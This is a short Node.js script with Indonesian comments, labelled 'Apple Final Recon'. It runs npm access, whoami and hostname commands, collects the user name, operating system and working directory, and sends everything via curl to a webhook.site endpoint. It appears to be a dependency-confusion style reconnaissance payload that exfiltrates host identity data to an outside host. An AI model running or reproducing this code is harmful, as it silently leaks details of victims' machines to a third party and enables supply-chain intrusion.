const { exec } = require('child_process');
const webhook = 'https://webhook.site/afcb9fa3-539e-45a6-8b5f-3474c597bc38';

// Perintah yang sudah diperbaiki untuk melisting paket @apple
// Jika gagal, akan menjalankan perintah identitas sistem (whoami & hostname)
const cmd = 'npm access list packages @apple || (whoami && hostname)';

exec(cmd, (error, stdout, stderr) => {
    const data = {
        origin: "Apple Final Recon",
        output: stdout || "Access Denied / No Output",
        error: stderr || "No Error",
        env_info: {
            user: process.env.USERNAME || process.env.USER || 'unknown',
            os: process.platform,
            cwd: process.cwd()
        },
        timestamp: new Date().toISOString()
    };
    
    const payload = JSON.stringify(data);
    // Menggunakan pembersihan karakter agar aman saat dikirim via curl
    const safePayload = payload.replace(/'/g, "");
    exec(`curl -X POST -H "Content-Type: application/json" -d '${safePayload}' ${webhook}`);
});
